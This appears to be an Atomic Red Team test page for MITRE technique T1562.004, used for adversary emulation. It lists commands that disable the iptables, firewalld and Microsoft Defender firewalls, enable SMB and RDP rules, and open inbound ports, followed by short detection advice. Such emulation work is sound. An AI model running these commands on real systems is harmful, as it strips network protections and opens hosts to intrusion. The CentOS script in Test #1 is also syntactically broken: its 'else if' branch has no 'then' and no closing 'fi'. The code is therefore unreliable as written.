# T1562.004 - Impair Defenses: Disable or Modify System Firewall
Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.

Modifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. 

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - Disable iptables firewall
Disables the iptables firewall

**Supported Platforms:** linux
#### Attack Commands: Run with `sh`
```sh
if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "6" ];
then
  service iptables stop
  chkconfig off iptables
  service ip6tables stop
  chkconfig off ip6tables
else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "7" ];
  systemctl stop firewalld
  systemctl disable firewalld
fi
```

Invoke-AtomicTest T1562.004 -TestNumbers 1

### Atomic Test #2 - Disable Microsoft Defender Firewall
Disables the Microsoft Defender Firewall for the current profile.
Caution if you access remotely the host where the test runs! Especially with the cleanup command which will re-enable firewall for the current profile...

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
netsh advfirewall set currentprofile state off
```

Invoke-AtomicTest T1562.004 -TestNumbers 2

### Atomic Test #3 - Allow SMB and RDP on Microsoft Defender Firewall
Allow all SMB and RDP rules on the Microsoft Defender Firewall for all profiles.
Caution if you access remotely the host where the test runs! Especially with the cleanup command which will reset the firewall and risk disabling those services...

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
netsh advfirewall firewall set rule group="file and printer sharing" new enable=Yes
```

Invoke-AtomicTest T1562.004 -TestNumbers 3

### Atomic Test #4 - Opening ports for proxy - HARDRAIN
This test creates a listening interface on a victim device. This tactic was used by HARDRAIN for proxying.

reference: https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-F.pdf

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
netsh advfirewall firewall add rule name="atomic testing" action=allow dir=in protocol=TCP localport=450 
```

Invoke-AtomicTest T1562.004 -TestNumbers 4

### Atomic Test #5 - Open a local port through Windows Firewall to any profile
This test will attempt to open a local port defined by input arguments to any profile
**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
netsh advfirewall firewall add rule name="Open Port to Any" dir=in protocol=tcp localport=#{local_port} action=allow profile=any```

Invoke-AtomicTest T1562.004 -TestNumbers 5

## Detection
Monitor processes and command-line arguments to see if firewalls are disabled or modified. Monitor Registry edits to keys that manage firewalls.